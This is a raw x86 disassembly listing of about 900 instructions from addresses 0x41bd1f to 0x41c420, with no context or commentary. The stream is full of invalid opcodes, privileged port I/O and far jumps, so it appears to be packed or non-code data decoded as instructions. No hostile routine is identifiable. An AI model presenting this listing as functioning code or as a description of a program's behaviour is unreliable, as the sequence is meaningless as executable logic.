  41bd1f:	mov    bh,0x5
  41bd21:	adc    eax,eax
  41bd23:	not    BYTE PTR [eax+0x1c24d62d]
  41bd29:	push   esp
  41bd2a:	jge    0x41bcd2
  41bd2c:	adc    ebp,DWORD PTR [esi+0xc748de2]
  41bd32:	mov    ah,0xb0
  41bd34:	fwait
  41bd35:	push   0x2e
  41bd37:	repnz cmp al,BYTE PTR [edx-0x45]
  41bd3b:	lods   eax,DWORD PTR ds:[esi]
  41bd3c:	pop    ebx
  41bd3d:	std    
  41bd3e:	add    al,0xb9
  41bd40:	popa   
  41bd41:	mov    bl,BYTE PTR [ebx]
  41bd43:	out    0x5b,eax
  41bd45:	repz jg 0x41bcce
  41bd48:	into   
  41bd49:	nop
  41bd4a:	push   eax
  41bd4b:	or     esi,0xf
  41bd4e:	outs   dx,BYTE PTR ds:[esi]
  41bd4f:	data16 lods al,BYTE PTR ds:[esi]
  41bd51:	shl    DWORD PTR [esi],0xdd
  41bd54:	sub    DWORD PTR [edi+0x66],eax
  41bd57:	push   0x2eae9dbc
  41bd5c:	fst    DWORD PTR [esi-0xb678bda]
  41bd62:	test   al,0x2
  41bd64:	jg     0x41bd72
  41bd66:	loope  0x41bcff
  41bd68:	and    DWORD PTR [esi],ebx
  41bd6a:	mov    ecx,0x948da168
  41bd6f:	push   ss
  41bd70:	xchg   edx,eax
  41bd71:	add    BYTE PTR [esi+0x5ac86176],ah
  41bd77:	dec    ecx
  41bd78:	ds xor ah,ah
  41bd7b:	pop    edx
  41bd7c:	popa   
  41bd7d:	dec    ebp
  41bd7e:	or     ebp,DWORD PTR [ecx+0x42]
  41bd81:	pop    ds
  41bd82:	repz mov ebp,0x4e89f469
  41bd88:	test   BYTE PTR [ebx],al
  41bd8a:	bswap  ecx
  41bd8c:	imul   eax,DWORD PTR [ecx],0xffffffac
  41bd8f:	pop    eax
  41bd90:	lahf   
  41bd91:	xchg   ecx,eax
  41bd92:	lock fcomp DWORD PTR [ecx+0x61]
  41bd97:	(bad)  
  41bd99:	sbb    DWORD PTR [ebx-0x5f],ebx
  41bd9c:	jbe    0x41bd32
  41bd9e:	cmp    eax,0xb6f34e4e
  41bda3:	xchg   esi,eax
  41bda4:	inc    esi
  41bda5:	sar    BYTE PTR [eax],1
  41bda7:	cld    
  41bda8:	pop    ds
  41bda9:	cmp    eax,0xfbbd81f3
  41bdae:	jl     0x41bd96
  41bdb0:	adc    DWORD PTR [ecx],ebp
  41bdb2:	iret   
  41bdb3:	mov    BYTE PTR [edi+0x5316ba51],bl
  41bdb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdba:	jl     0x41bd86
  41bdbc:	mov    bh,0x4
  41bdbe:	aad    0x9f
  41bdc0:	pop    eax
  41bdc1:	(bad)  
  41bdc2:	mov    dh,BYTE PTR [edi]
  41bdc4:	jle    0x41be06
  41bdc6:	dec    ebp
  41bdc7:	test   BYTE PTR [esi],ch
  41bdc9:	fist   WORD PTR [ecx-0x27]
  41bdcc:	sub    dl,al
  41bdce:	(bad)  
  41bdcf:	mov    eax,DWORD PTR [edi+0x1d20ee0b]
  41bdd5:	pop    edx
  41bdd6:	pop    eax
  41bdd7:	and    ch,BYTE PTR [edi-0x6392ef4a]
  41bddd:	fidivr WORD PTR [esi]
  41bddf:	push   0x9a7864dd
  41bde4:	ins    BYTE PTR es:[edi],dx
  41bde5:	jns    0x41bdca
  41bde7:	jge    0x41bdef
  41bde9:	jp     0x41bd6d
  41bdeb:	jmp    0xdc76:0xeb3252be
  41bdf2:	int    0x27
  41bdf4:	mov    eax,eax
  41bdf6:	outs   dx,BYTE PTR ds:[esi]
  41bdf7:	clc    
  41bdf8:	inc    ecx
  41bdf9:	inc    ebx
  41bdfa:	add    DWORD PTR [edx+0xf],edi
  41bdfd:	xor    DWORD PTR [ecx+0x4f],0x995bd52e
  41be04:	mov    ecx,DWORD PTR [edx]
  41be06:	sbb    DWORD PTR [edx-0x3a],esi
  41be09:	dec    esp
  41be0a:	std    
  41be0b:	iret   
  41be0c:	cwde   
  41be0d:	ret    0x467e
  41be10:	jnp    0x41bdb0
  41be12:	in     eax,dx
  41be13:	xor    DWORD PTR [ebx-0x7b],0x3b
  41be17:	cmp    eax,DWORD PTR [esi-0x4001513f]
  41be1d:	mov    ebx,0x8c0e1e1a
  41be22:	or     eax,0x7a97312
  41be27:	mov    ebx,0xff6980ca
  41be2c:	(bad)  
  41be2d:	cld    
  41be2e:	push   ds
  41be2f:	sub    ebx,esi
  41be31:	outs   dx,BYTE PTR ds:[esi]
  41be32:	sub    eax,0x84bd7432
  41be37:	cmp    ebx,DWORD PTR [eax-0x248b24f]
  41be3d:	lods   al,BYTE PTR ds:[esi]
  41be3e:	cdq    
  41be3f:	inc    esp
  41be40:	mov    ebx,0x46c40b62
  41be45:	repnz sbb BYTE PTR [edi+0x65],dl
  41be49:	and    dl,bh
  41be4b:	dec    ebp
  41be4c:	and    bh,BYTE PTR [eax-0x9]
  41be4f:	pop    esp
  41be50:	dec    eax
  41be51:	or     DWORD PTR [ebx+0x7f4edb8d],eax
  41be57:	xchg   esi,eax
  41be58:	pop    es
  41be59:	xchg   esp,eax
  41be5a:	repnz mov esp,0x99bf107b
  41be60:	mov    ebp,eax
  41be62:	mov    esi,0xbe14a913
  41be67:	rol    BYTE PTR [ecx+eax*4],0x66
  41be6b:	test   BYTE PTR [edi-0x1c],dh
  41be6e:	jp     0x41be1a
  41be70:	push   ebp
  41be71:	mov    eax,ds:0xd376d481
  41be76:	xor    cl,BYTE PTR [ebx-0x75]
  41be79:	adc    BYTE PTR [edi],ah
  41be7b:	loop   0x41beba
  41be7d:	sti    
  41be7e:	push   edi
  41be7f:	stos   DWORD PTR es:[edi],eax
  41be80:	xchg   DWORD PTR [ecx],ebx
  41be82:	mov    bl,0xb6
  41be84:	test   eax,0x5226e5ca
  41be89:	adc    DWORD PTR [ecx+0x4d],esp
  41be8c:	push   ebx
  41be8d:	stos   DWORD PTR es:[edi],eax
  41be8e:	out    0x9e,al
  41be90:	adc    BYTE PTR [esi+ecx*1],ch
  41be93:	clc    
  41be94:	inc    ebx
  41be95:	pop    esi
  41be96:	call   0x8d1b:0x5985243e
  41be9d:	outs   dx,DWORD PTR ds:[esi]
  41be9e:	dec    esp
  41be9f:	jo     0x41bea6
  41bea1:	adc    eax,0xc834b75c
  41bea6:	popf   
  41bea7:	add    ah,BYTE PTR [esi]
  41bea9:	push   0xfffffff2
  41beab:	sbb    DWORD PTR [edx],esi
  41bead:	add    ecx,ecx
  41beaf:	sti    
  41beb0:	mov    edx,0xe226c3ea
  41beb5:	cdq    
  41beb6:	sub    edi,DWORD PTR [edx]
  41beb8:	imul   ecx,DWORD PTR [eax],0xffffffee
  41bebb:	mov    eax,ds:0xaaa3f479
  41bec0:	add    eax,0x5f9cadf0
  41bec5:	iret   
  41bec6:	dec    ebp
  41bec7:	xchg   edi,edx
  41bec9:	add    BYTE PTR [eax+edi*1-0x51],ch
  41becd:	mov    al,ds:0x4bedd0ab
  41bed2:	mov    ah,0x5f
  41bed4:	or     cl,BYTE PTR [edx]
  41bed6:	or     DWORD PTR [ebp-0x1d],ebx
  41bed9:	not    BYTE PTR [edx-0x66]
  41bedc:	aam    0xa5
  41bede:	pop    ss
  41bedf:	aaa    
  41bee0:	xchg   ebp,eax
  41bee1:	out    0xd1,al
  41bee3:	adc    BYTE PTR [edx-0x1af90584],0xb1
  41beea:	jbe    0x41befe
  41beec:	inc    esp
  41beed:	inc    esp
  41beee:	cmp    al,0xf1
  41bef0:	mov    dh,0x6b
  41bef2:	mov    ecx,0x1a5343f7
  41bef7:	cmp    al,0xee
  41bef9:	xchg   DWORD PTR [ebx],edx
  41befb:	int3   
  41befc:	repnz dec eax
  41befe:	inc    ebp
  41beff:	jg     0x41be84
  41bf01:	int    0xc0
  41bf03:	ins    BYTE PTR es:[edi],dx
  41bf04:	fisttp QWORD PTR [edi+esi*1-0x46]
  41bf08:	pop    eax
  41bf09:	test   al,0xc6
  41bf0b:	xor    BYTE PTR [ecx-0x1e],0x33
  41bf0f:	clc    
  41bf10:	cmp    ebp,DWORD PTR [ebx+0x2b5c5c6c]
  41bf16:	cmp    eax,0xd5ccdd29
  41bf1b:	mov    dl,0x6b
  41bf1d:	push   ebx
  41bf1e:	popa   
  41bf1f:	int    0xd
  41bf21:	mov    esi,0xc0f8f6e0
  41bf26:	cmp    DWORD PTR [edi-0x1c],edx
  41bf29:	jl     0x41bee1
  41bf2b:	push   eax
  41bf2c:	inc    esi
  41bf2d:	ja     0x41bef8
  41bf2f:	xor    eax,0xe82c9e1a
  41bf34:	push   0x6a08d47d
  41bf39:	in     al,0xa5
  41bf3b:	add    ebx,0xffffff9c
  41bf3e:	test   BYTE PTR [ecx-0x7730c7c6],ah
  41bf44:	adc    cl,BYTE PTR [ebx]
  41bf46:	pop    edi
  41bf47:	lock xchg edi,eax
  41bf49:	jns    0x41bf44
  41bf4b:	sub    edi,ebp
  41bf4d:	push   ss
  41bf4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf4f:	xor    BYTE PTR [eax],bl
  41bf51:	loope  0x41bf3f
  41bf53:	icebp  
  41bf54:	xor    dh,dl
  41bf56:	fdiv   DWORD PTR [eax]
  41bf58:	and    eax,0xe5fcaabc
  41bf5d:	outs   dx,BYTE PTR ds:[esi]
  41bf5e:	test   DWORD PTR [ebx+edx*8-0x38ae62bb],edi
  41bf65:	aad    0x79
  41bf67:	dec    edi
  41bf68:	sub    BYTE PTR [edx+ebx*4],bl
  41bf6b:	sbb    al,0xf3
  41bf6d:	repnz dec ch
  41bf70:	fistp  QWORD PTR [edx+0x6b]
  41bf73:	arpl   ax,bp
  41bf75:	rol    dh,0x22
  41bf78:	enter  0xd1ae,0xbf
  41bf7c:	pop    eax
  41bf7d:	push   es
  41bf7e:	ror    ecx,1
  41bf80:	dec    edx
  41bf81:	jb     0x41bf2d
  41bf83:	arpl   WORD PTR [ecx+eax*1],si
  41bf86:	aas    
  41bf87:	xor    eax,0x807cdf5a
  41bf8c:	inc    esp
  41bf8d:	dec    edi
  41bf8e:	cmp    ah,BYTE PTR [eax-0x1d]
  41bf91:	imul   ecx,DWORD PTR [ebx-0x63],0xffffffa7
  41bf95:	daa    
  41bf96:	mov    eax,0xaadccecc
  41bf9b:	leave  
  41bf9c:	xchg   ebx,eax
  41bf9d:	lahf   
  41bf9e:	(bad)  [edi]
  41bfa0:	inc    esp
  41bfa1:	in     al,dx
  41bfa2:	in     al,dx
  41bfa3:	rcl    al,0xce
  41bfa6:	mov    al,0x77
  41bfa8:	cwde   
  41bfa9:	or     al,0xcc
  41bfac:	push   0x51
  41bfae:	sub    ecx,esp
  41bfb0:	mov    cl,0xad
  41bfb2:	test   bl,0xed
  41bfb5:	and    bl,BYTE PTR [eax+0x376d773e]
  41bfbb:	jle    0x41bf3d
  41bfbd:	sub    DWORD PTR [eax+0x6c4aa61],0xffffff9b
  41bfc4:	xor    dh,ch
  41bfc6:	pop    es
  41bfc7:	imul   ecx,DWORD PTR [ecx],0x341b96f0
  41bfcd:	je     0x41c022
  41bfcf:	fadd   st,st(0)
  41bfd1:	mov    esp,0x9cd65b1a
  41bfd6:	(bad)  
  41bfd8:	in     al,0x61
  41bfda:	inc    esi
  41bfdb:	inc    esp
  41bfdc:	pop    edx
  41bfdd:	add    BYTE PTR [edi-0x39],ah
  41bfe0:	xchg   BYTE PTR [eax+eiz*1+0x36e8ccc7],cl
  41bfe7:	(bad)  
  41bfe9:	xor    BYTE PTR [ebp-0x5c],al
  41bfec:	xchg   esp,eax
  41bfed:	cmc    
  41bfee:	hlt    
  41bfef:	and    ebp,DWORD PTR [esi-0xa]
  41bff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bff3:	xchg   esp,eax
  41bff4:	and    BYTE PTR [edx+0x4d9dac29],cl
  41bffa:	cmp    BYTE PTR [ecx-0x7ceb4e4b],ah
  41c000:	xchg   esi,eax
  41c001:	je     0x41c063
  41c003:	ror    DWORD PTR [eax-0x721663da],0x5e
  41c00a:	push   esi
  41c00b:	retf   0x3e3a
  41c00e:	xlat   BYTE PTR ds:[ebx]
  41c00f:	cmp    al,BYTE PTR [ebx]
  41c011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c012:	push   esi
  41c013:	pop    esp
  41c014:	mov    bh,0x7
  41c016:	test   al,0x5c
  41c018:	je     0x41bfb5
  41c01a:	fnstsw WORD PTR [edx+0x1b28aa0f]
  41c020:	jno    0x41c07c
  41c022:	div    BYTE PTR [eax+0x77]
  41c025:	mov    BYTE PTR [esi],bl
  41c027:	ins    BYTE PTR es:[edi],dx
  41c028:	mov    BYTE PTR [eax],bl
  41c02a:	dec    ebx
  41c02b:	lds    ebp,FWORD PTR [ebp+0x460d3e57]
  41c031:	ficom  DWORD PTR [edx+eiz*8-0x47]
  41c035:	jns    0x41c082
  41c037:	sbb    cl,bh
  41c039:	rol    BYTE PTR [ecx-0x3f539135],1
  41c03f:	iret   
  41c040:	stc    
  41c041:	test   al,0x33
  41c043:	pop    ebp
  41c044:	cmp    dl,bl
  41c046:	jae    0x41c065
  41c048:	std    
  41c049:	inc    ebp
  41c04a:	sar    BYTE PTR [ebx],cl
  41c04c:	xchg   esp,eax
  41c04d:	or     ebx,edi
  41c04f:	xchg   esp,eax
  41c050:	adc    BYTE PTR [edi+eax*1-0x6a],al
  41c054:	mov    esp,0x43c67a15
  41c059:	push   edi
  41c05a:	pop    ebx
  41c05b:	clc    
  41c05c:	ins    DWORD PTR es:[edi],dx
  41c05d:	jmp    0x41c048
  41c05f:	adc    eax,0xda4bec67
  41c064:	dec    eax
  41c065:	and    bl,dl
  41c067:	inc    di
  41c069:	xchg   ebp,esi
  41c06b:	fistp  QWORD PTR [ebx+0x10b9ff6]
  41c071:	out    0xf1,eax
  41c073:	push   eax
  41c074:	jp     0x41c093
  41c076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c077:	lods   al,BYTE PTR ds:[esi]
  41c078:	cwde   
  41c079:	adc    DWORD PTR [esp+esi*8+0x4],eax
  41c07d:	or     BYTE PTR [esi-0x5044505d],ah
  41c083:	xchg   ebp,eax
  41c084:	lahf   
  41c085:	dec    esp
  41c086:	mov    ecx,0x9a3f921c
  41c08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c08c:	jo     0x41c0af
  41c08e:	in     eax,dx
  41c08f:	in     al,dx
  41c090:	enter  0x9e0,0x2f
  41c094:	inc    edx
  41c095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c096:	sub    bl,BYTE PTR [ecx+0x3c16b625]
  41c09c:	xor    esp,esp
  41c09e:	pop    edx
  41c09f:	pusha  
  41c0a0:	cmp    BYTE PTR [ebx],ch
  41c0a2:	jle    0x41c109
  41c0a4:	cmp    DWORD PTR [ebp-0xc],esi
  41c0a7:	hlt    
  41c0a8:	cmp    edi,DWORD PTR [edi+0x50]
  41c0ab:	pop    edx
  41c0ac:	inc    edi
  41c0ad:	(bad)  
  41c0ae:	bound  edi,QWORD PTR [ecx+0x30]
  41c0b1:	mov    DWORD PTR [edi+0x53ebb950],0x3f2534f6
  41c0bb:	ret    0x6ec5
  41c0be:	int    0x2a
  41c0c0:	leave  
  41c0c1:	std    
  41c0c2:	clc    
  41c0c3:	and    BYTE PTR [edi],ah
  41c0c5:	out    0x78,eax
  41c0c7:	push   eax
  41c0c8:	inc    esi
  41c0c9:	or     edi,DWORD PTR [ebx+0x54]
  41c0cc:	xchg   DWORD PTR [eax+esi*2-0x1eb97a26],edi
  41c0d3:	adc    al,0x20
  41c0d5:	xchg   ebx,eax
  41c0d6:	and    eax,0x25f0f389
  41c0db:	add    al,0xd7
  41c0dd:	and    dh,BYTE PTR [ebx+0x5d37abe0]
  41c0e3:	or     DWORD PTR [edx],edi
  41c0e5:	jecxz  0x41c0b7
  41c0e7:	rcr    DWORD PTR [edx+0x23e1137e],cl
  41c0ed:	sahf   
  41c0ee:	cmp    DWORD PTR ds:0x12b5572b,ebp
  41c0f4:	mov    al,bl
  41c0f6:	mov    ds:0x92ed79c0,al
  41c0fb:	daa    
  41c0fc:	fsubr  DWORD PTR [ecx]
  41c0fe:	lahf   
  41c0ff:	cmp    bh,BYTE PTR [edx]
  41c101:	clc    
  41c102:	ficom  WORD PTR [ecx+0x31]
  41c105:	fnstcw WORD PTR [ecx-0x7c627e96]
  41c10b:	mov    ch,0x6e
  41c10d:	setnp  BYTE PTR [edx+0x66a79d96]
  41c114:	iret   
  41c115:	addr16 je 0x41c131
  41c118:	imul   BYTE PTR [esi+0x2f3f88d6]
  41c11e:	test   BYTE PTR [ebp+ebp*8-0x3119e2de],dl
  41c125:	jecxz  0x41c186
  41c127:	mov    dl,0x3d
  41c129:	into   
  41c12a:	mov    DWORD PTR [esi],ecx
  41c12c:	add    dh,cl
  41c12e:	fdivp  st(4),st
  41c130:	push   edi
  41c131:	sbb    al,0x2
  41c133:	inc    ebp
  41c134:	cwde   
  41c135:	xor    BYTE PTR [ebx],0x4e
  41c138:	sbb    dl,cl
  41c13a:	aad    0xc1
  41c13c:	pop    ebx
  41c13d:	repnz aas 
  41c13f:	xor    BYTE PTR [ebx-0x59],0xb2
  41c143:	int    0x75
  41c145:	js     0x41c15f
  41c147:	mov    dh,0x78
  41c149:	ins    BYTE PTR es:[edi],dx
  41c14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c14b:	xor    esp,ecx
  41c14d:	dec    ecx
  41c14e:	popa   
  41c14f:	gs inc eax
  41c151:	mul    DWORD PTR [ebx+0x1d824d04]
  41c157:	jg     0x41c0fb
  41c159:	pop    ds
  41c15a:	mov    edx,0xad9ba4f3
  41c15f:	cmc    
  41c160:	loope  0x41c15a
  41c162:	and    cl,BYTE PTR [edx+0xf]
  41c165:	push   esi
  41c166:	mov    bh,ch
  41c168:	mov    edi,DWORD PTR [edx-0x2b2c0547]
  41c16e:	adc    BYTE PTR [edi],dl
  41c170:	callw  0x63e5
  41c174:	repz pop ss
  41c176:	gs popf 
  41c178:	shr    BYTE PTR [edx-0x7cb50091],1
  41c17e:	push   0xffffffb5
  41c180:	sbb    esp,ebx
  41c182:	cmc    
  41c183:	xlat   BYTE PTR ds:[ebx]
  41c184:	add    esi,edx
  41c186:	lock or BYTE PTR [esi-0x448a08df],ch
  41c18d:	dec    edx
  41c18e:	push   es
  41c18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c190:	dec    esp
  41c191:	test   eax,0x1f41e478
  41c196:	mov    ds:0x318d0dd1,eax
  41c19b:	ins    BYTE PTR es:[edi],dx
  41c19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c19d:	push   cs
  41c19e:	jae    0x41c1ab
  41c1a0:	add    esp,edx
  41c1a2:	jae    0x41c222
  41c1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1a5:	ja     0x41c223
  41c1a7:	push   esp
  41c1a8:	sbb    DWORD PTR [ebx],esp
  41c1aa:	pusha  
  41c1ab:	sub    al,0x6b
  41c1ad:	retf   
  41c1ae:	jbe    0x41c19b
  41c1b0:	pop    edx
  41c1b1:	xor    ch,0x87
  41c1b4:	pop    es
  41c1b5:	adc    cl,BYTE PTR [ecx+0x214abe0a]
  41c1bb:	xchg   BYTE PTR [eax+0x44],ah
  41c1be:	jmp    0x654936e4
  41c1c3:	mov    ch,0x67
  41c1c5:	rol    BYTE PTR [edi+0x7d2e5734],0xf8
  41c1cc:	push   edx
  41c1cd:	bound  eax,QWORD PTR [esi-0xb]
  41c1d0:	push   esi
  41c1d1:	xrelease xchg DWORD PTR [ebx-0x1b],edx
  41c1d5:	add    al,0x8e
  41c1d7:	jl     0x41c167
  41c1d9:	mov    eax,0xa7bfa2de
  41c1de:	dec    esp
  41c1df:	xchg   DWORD PTR [edi+esi*2-0x22],edi
  41c1e3:	push   eax
  41c1e4:	fld    TBYTE PTR [edi]
  41c1e6:	ss push cs
  41c1e8:	lods   eax,DWORD PTR ds:[esi]
  41c1e9:	call   0x776c:0xdb72eb56
  41c1f0:	xchg   ebp,eax
  41c1f1:	sbb    eax,edi
  41c1f3:	test   ch,cl
  41c1f5:	shl    al,1
  41c1f7:	mov    ebp,0xa80699e2
  41c1fc:	mov    ebx,0xcf119ae
  41c201:	hlt    
  41c202:	ins    BYTE PTR es:[edi],dx
  41c203:	es fwait
  41c205:	dec    esp
  41c206:	dec    edx
  41c207:	inc    esi
  41c208:	jmp    0x6b55f785
  41c20d:	sub    cl,BYTE PTR ds:0x860a667e
  41c213:	jp     0x41c1e8
  41c215:	adc    al,0xe3
  41c217:	les    ebx,FWORD PTR [edi]
  41c219:	push   eax
  41c21a:	pop    ebx
  41c21b:	les    esi,FWORD PTR [ecx]
  41c21d:	mov    ds:0xed7ea421,eax
  41c222:	xlat   BYTE PTR ds:[ebx]
  41c223:	xchg   edi,eax
  41c224:	adc    ebp,DWORD PTR [ecx-0x6d95a7b7]
  41c22a:	mov    ds:0xa6afc197,al
  41c22f:	xchg   eax,edx
  41c231:	es lock dec ebx
  41c234:	arpl   WORD PTR [ebx],dx
  41c236:	dec    ebp
  41c237:	(bad)  
  41c238:	push   ebp
  41c239:	leave  
  41c23a:	mov    edi,0x2ee1bdc2
  41c23f:	loop   0x41c257
  41c241:	jb     0x41c1cc
  41c243:	stos   DWORD PTR es:[edi],eax
  41c244:	aaa    
  41c245:	pusha  
  41c246:	push   0x4b
  41c248:	xlat   BYTE PTR ds:[ebx]
  41c249:	xor    edi,esi
  41c24b:	push   ds
  41c24c:	dec    ebp
  41c24d:	pop    ss
  41c24e:	jg     0x41c1e3
  41c250:	shr    cl,1
  41c252:	jb     0x41c2bb
  41c254:	xchg   edx,eax
  41c255:	xchg   ebx,eax
  41c256:	mov    eax,ds:0xb5c70911
  41c25b:	shl    DWORD PTR [esi-0x2b],1
  41c25e:	mov    eax,0xf5d95f67
  41c263:	mov    bl,0x6
  41c265:	push   es
  41c266:	adc    dh,BYTE PTR [ebx+edi*8]
  41c269:	test   bl,cl
  41c26b:	arpl   WORD PTR [eax],di
  41c26d:	and    DWORD PTR [esi-0x5],0x18
  41c271:	rcl    BYTE PTR [edi],1
  41c273:	ret    
  41c274:	inc    edx
  41c275:	rcl    DWORD PTR [esi-0x6f],0x33
  41c279:	and    al,0xb4
  41c27b:	sbb    eax,0x4d3fd16e
  41c280:	pop    esi
  41c281:	pop    ebp
  41c282:	leave  
  41c283:	push   edi
  41c284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c285:	cmp    esi,0x95352cad
  41c28b:	out    dx,eax
  41c28c:	mov    edx,0x73e857c9
  41c291:	xchg   BYTE PTR [edx],dl
  41c293:	outs   dx,BYTE PTR ds:[esi]
  41c294:	pop    ds
  41c295:	xor    eax,0x3ab7d27e
  41c29a:	or     al,0x86
  41c29c:	jbe    0x41c29c
  41c29e:	pop    ebx
  41c29f:	(bad)  
  41c2a0:	int    0x93
  41c2a2:	nop
  41c2a3:	jnp    0x41c2b0
  41c2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2a6:	lods   al,BYTE PTR ds:[esi]
  41c2a7:	and    al,0x64
  41c2a9:	sub    BYTE PTR [edi-0x9550c35],cl
  41c2af:	cld    
  41c2b0:	loope  0x41c2cd
  41c2b2:	jo     0x41c26e
  41c2b4:	add    BYTE PTR [ebx],0xc
  41c2b7:	div    BYTE PTR [ecx+0x4a]
  41c2ba:	push   ebp
  41c2bb:	or     DWORD PTR [esi],ebx
  41c2bd:	push   0xe7715094
  41c2c2:	(bad)
  41c2c5:	ja     0x41c2d7
  41c2c7:	xchg   ebx,eax
  41c2c8:	and    edi,DWORD PTR [edi+0x3a]
  41c2cb:	dec    ecx
  41c2cc:	fistp  WORD PTR [ebx+0x7597d10c]
  41c2d2:	cmp    eax,0xb0cb3e3a
  41c2d7:	mov    esi,0x11bf3a
  41c2dc:	sti    
  41c2dd:	cmp    ah,BYTE PTR [eax-0x2502d8c5]
  41c2e3:	mov    ds,WORD PTR [ebx+0x73]
  41c2e6:	scas   eax,DWORD PTR es:[edi]
  41c2e7:	pop    esi
  41c2e8:	pop    esi
  41c2e9:	std    
  41c2ea:	inc    edi
  41c2eb:	cmp    bl,bl
  41c2ed:	and    DWORD PTR [esi-0x7],ecx
  41c2f0:	fs cli 
  41c2f2:	ficom  DWORD PTR [eax+0x5a]
  41c2f5:	in     al,0x5a
  41c2f7:	das    
  41c2f8:	inc    eax
  41c2f9:	mov    edi,0x6f0e556b
  41c2fe:	mov    bh,BYTE PTR es:[ebp+0x4c]
  41c302:	and    al,0x4c
  41c304:	push   0x5d58d3fb
  41c309:	and    cl,ah
  41c30b:	in     eax,dx
  41c30c:	stos   BYTE PTR es:[edi],al
  41c30d:	sub    eax,DWORD PTR [eax]
  41c30f:	dec    ecx
  41c310:	xor    eax,0x19272bf3
  41c315:	mov    bl,0xcf
  41c317:	es push edi
  41c319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c31a:	mov    ebx,DWORD PTR [ecx-0x6c]
  41c31d:	jecxz  0x41c2fb
  41c31f:	cmp    eax,0xa0e603b5
  41c324:	push   cs
  41c325:	adc    DWORD PTR [eax+0x11],ebx
  41c328:	sahf   
  41c329:	xor    DWORD PTR [edi-0x10728540],ecx
  41c32f:	outs   dx,DWORD PTR ds:[esi]
  41c330:	ficom  DWORD PTR [edx]
  41c332:	scas   eax,DWORD PTR es:[edi]
  41c333:	xlat   BYTE PTR ds:[ebx]
  41c334:	pop    es
  41c335:	test   BYTE PTR [ecx+0x48],dh
  41c338:	xlat   BYTE PTR ds:[ebx]
  41c339:	scas   eax,DWORD PTR es:[edi]
  41c33a:	fucom  st(6)
  41c33c:	cmp    esi,DWORD PTR [ebp-0x47f4f8c9]
  41c342:	jle    0x41c396
  41c344:	and    edi,DWORD PTR [ecx-0x10422fce]
  41c34a:	shl    DWORD PTR [ebp-0x31],0xbd
  41c34e:	push   es
  41c34f:	aad    0xa2
  41c351:	int    0xf5
  41c353:	cmp    ebx,DWORD PTR [esi-0x68]
  41c356:	and    eax,ebx
  41c358:	xlat   BYTE PTR ds:[ebx]
  41c359:	sbb    ebx,DWORD PTR [eax]
  41c35b:	jge    0x41c38a
  41c35d:	clc    
  41c35e:	jmp    FWORD PTR [ebp-0x3f04184c]
  41c364:	add    BYTE PTR [ebx-0x28],cl
  41c367:	push   esp
  41c368:	arpl   WORD PTR [edx],ax
  41c36a:	lds    eax,FWORD PTR ds:0xa11727fb
  41c370:	icebp  
  41c371:	xor    al,0xc1
  41c373:	xchg   esp,eax
  41c374:	mov    gs,WORD PTR [ecx+0x21]
  41c377:	call   0xadeab2af
  41c37c:	aam    0x18
  41c37e:	ins    WORD PTR es:[edi],dx
  41c380:	pusha  
  41c381:	pop    ds
  41c382:	pushf  
  41c383:	mov    WORD PTR [ecx],es
  41c385:	(bad)  
  41c386:	cmp    ch,BYTE PTR [esi]
  41c388:	dec    esp
  41c389:	pop    edx
  41c38a:	dec    esi
  41c38b:	pop    es
  41c38c:	ja     0x41c3a7
  41c38e:	popf   
  41c38f:	test   al,0x91
  41c391:	mov    ah,BYTE PTR [esi+0x3ff4e022]
  41c397:	mov    edx,DWORD PTR [esi+esi*2+0x3a5b6ec1]
  41c39e:	cs repz inc eax
  41c3a1:	xor    edx,esi
  41c3a3:	mov    ds:0x719e7595,al
  41c3a8:	pop    ecx
  41c3a9:	push   esp
  41c3aa:	xchg   esi,eax
  41c3ab:	mov    dh,0xa9
  41c3ad:	in     al,dx
  41c3ae:	sbb    dh,BYTE PTR [ebx+esi*1]
  41c3b1:	hlt    
  41c3b2:	imul   edx,DWORD PTR [esi-0x565436ed],0x636b4ed1
  41c3bc:	shl    dh,cl
  41c3be:	adc    dh,BYTE PTR [eax]
  41c3c0:	es sub eax,0xa0c08eb5
  41c3c6:	cld    
  41c3c7:	push   edx
  41c3c8:	mov    ds:0x3f094a96,al
  41c3cd:	mov    eax,ss:0xb603d2ba
  41c3d3:	dec    ebx
  41c3d4:	xchg   ebp,eax
  41c3d5:	mov    ah,0x82
  41c3d7:	imul   esp,DWORD PTR [edi+edx*4+0x2b],0xffffffe1
  41c3dc:	pop    es
  41c3dd:	test   al,0x52
  41c3df:	inc    ebp
  41c3e0:	pushf  
  41c3e1:	loop   0x41c375
  41c3e3:	fldcw  WORD PTR [esi-0x48]
  41c3e6:	sbb    ecx,DWORD PTR [edx]
  41c3e8:	out    dx,al
  41c3e9:	xchg   ecx,eax
  41c3ea:	push   edi
  41c3eb:	jo     0x41c385
  41c3ed:	add    esp,DWORD PTR [edx+0x36b3752c]
  41c3f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3f4:	jp     0x41c474
  41c3f6:	iret   
  41c3f7:	and    BYTE PTR [esi-0x39cb7f6f],al
  41c3fd:	xor    DWORD PTR [ecx+ecx*1+0x5b],ebp
  41c401:	xor    eax,esp
  41c403:	mov    bl,0xb8
  41c405:	in     al,dx
  41c406:	stc    
  41c407:	enter  0x1090,0x97
  41c40b:	scas   al,BYTE PTR es:[edi]
  41c40c:	xor    cl,BYTE PTR [ebp+0x70d3f589]
  41c412:	outs   dx,DWORD PTR ds:[esi]
  41c413:	or     dl,cl
  41c415:	rcl    BYTE PTR [edi-0x43],1
  41c418:	fnstcw WORD PTR [ebx]
  41c41a:	sahf   
  41c41b:	fiadd  WORD PTR [ebx-0x67]
  41c41e:	or     al,0x8e
  41c420:	xor    esp,DWORD PTR [eax]
